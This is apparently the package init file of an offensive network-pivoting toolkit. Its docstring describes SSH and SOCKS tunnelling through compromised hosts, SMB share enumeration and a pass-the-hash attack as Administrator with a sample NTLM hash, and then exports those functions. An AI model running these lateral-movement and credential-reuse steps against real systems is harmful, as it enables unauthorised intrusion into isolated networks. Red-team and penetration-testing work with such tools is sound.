"""
KRYON Network Pivoting Tools

Advanced network pivoting, tunneling, and lateral movement.

Clearance Level: Alpha-Orange (Network Infiltration Authority)
Mission: Pivot through compromised hosts to reach isolated networks

Available Modules:
- tunneling: SSH tunneling, SOCKS proxies, Chisel tunneling
- lateral_movement: PSExec, WMI, pass-the-hash, SMB enumeration

Example Usage:
    >>> from skynet.tools.pivoting import (
    ...     ssh_dynamic_port_forward,
    ...     ssh_local_port_forward,
    ...     psexec_lateral_movement,
    ...     enumerate_smb_shares,
    ...     pass_the_hash_attack
    ... )
    >>>
    >>> # Create SOCKS proxy through compromised Linux host
    >>> result = ssh_dynamic_port_forward(
    ...     ssh_host="10.10.10.5",
    ...     ssh_user="compromised_user",
    ...     socks_port=1080,
    ...     ssh_key="/tmp/id_rsa"
    ... )
    >>>
    >>> print(f"SOCKS proxy: {result['socks_proxy']}")
    >>> print(f"Use: proxychains nmap -sT 192.168.1.0/24")
    >>>
    >>> # Enumerate SMB shares on internal network (through SOCKS proxy)
    >>> shares = enumerate_smb_shares("192.168.1.10")
    >>> for share in shares['writable_shares']:
    ...     print(f"Writable: {share}")
    >>>
    >>> # Pass-the-hash to internal Windows host
    >>> result = pass_the_hash_attack(
    ...     target_host="192.168.1.10",
    ...     username="Administrator",
    ...     ntlm_hash="aad3b435b51404eeaad3b435b51404ee:8846...",
    ...     command="whoami",
    ...     method="psexec"
    ... )
"""

from .lateral_movement import (
    enumerate_smb_shares,
    pass_the_hash_attack,
    psexec_lateral_movement,
    winrm_lateral_movement,
    wmi_lateral_movement,
)
from .tunneling import (
    kill_tunnel,
    setup_chisel_tunnel,
    ssh_dynamic_port_forward,
    ssh_local_port_forward,
    ssh_remote_port_forward,
)

__all__ = [
    # Tunneling functions
    "ssh_local_port_forward",
    "ssh_remote_port_forward",
    "ssh_dynamic_port_forward",
    "setup_chisel_tunnel",
    "kill_tunnel",
    # Lateral movement functions
    "psexec_lateral_movement",
    "wmi_lateral_movement",
    "enumerate_smb_shares",
    "pass_the_hash_attack",
    "winrm_lateral_movement",
]
